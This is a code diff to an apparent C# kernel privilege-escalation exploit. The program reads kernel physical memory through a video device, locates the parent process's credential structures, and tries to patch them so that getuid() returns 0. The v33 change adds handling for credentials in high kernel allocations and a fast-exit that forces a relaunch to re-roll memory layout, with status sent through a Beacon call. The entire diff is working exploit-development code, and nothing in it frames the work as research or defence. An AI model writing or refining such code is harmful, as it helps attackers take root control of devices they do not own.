@@ -1217,6 +1217,14 @@ internal static class Program
                     // (v27 cold boot: cred=00000000 for 20 s) - stop re-reading
                     // it and hand over to the content scan below.
                     bool sawKptr = false;
+                    // v33: a high task/cred read is not a timing problem. If the
+                    // parent task or its cred lives at/above 0xE0000000, video40
+                    // cannot read it coherently (0/21 high creds across the cold
+                    // boots); more rounds/waits only delay the fresh-process
+                    // re-roll.  sawLow keeps a low-but-write-failed cred on the
+                    // normal retry/scan path.
+                    bool sawLow = false, highAlloc = false;
+                    uint highParent = 0, highCred = 0;
                     for (int pr = 0; pr < 8 && getuid() != 0; pr++)
                     {
                         DropPages();
@@ -1238,6 +1246,21 @@ internal static class Program
                                 try { real = U32(ReadPhys(V2P(parent) + O_REAL, 4), 0); } catch { }
                             }
                             if (Kptr(cred) || Kptr(real)) sawKptr = true;
+                            if (Kptr(parent) && parent >= 0xE0000000)
+                            {
+                                highAlloc = true;
+                                highParent = parent;
+                            }
+                            if (Kptr(cred))
+                            {
+                                if (cred >= 0xE0000000) { highAlloc = true; highCred = cred; }
+                                else sawLow = true;
+                            }
+                            if (Kptr(real))
+                            {
+                                if (real >= 0xE0000000) { highAlloc = true; highCred = real; }
+                                else sawLow = true;
+                            }
                             uint u = CredUid(cred);
                             if (u == 5001)
                             {
@@ -1299,6 +1322,15 @@ internal static class Program
                         if (getuid() == 0) break;
                         if (pr == 2 && !sawKptr) break;
                         Thread.Sleep(250);
+                    }
+                    // v33: fast-exit on an unreadable high allocation instead of
+                    // spending the waits/scan; AUL's relaunch is the allocation
+                    // re-roll.  Only fast mode: long mode must not loop exits.
+                    if (highAlloc && !sawLow && fastMode && getuid() != 0)
+                    {
+                        Beacon("high-alloc parent=" + highParent.ToString("x8") +
+                               " cred=" + highCred.ToString("x8") + " fast-exit");
+                        break;
                     }
                     if (getuid() == 0) Beacon("direct-patch uid=0");
                 }
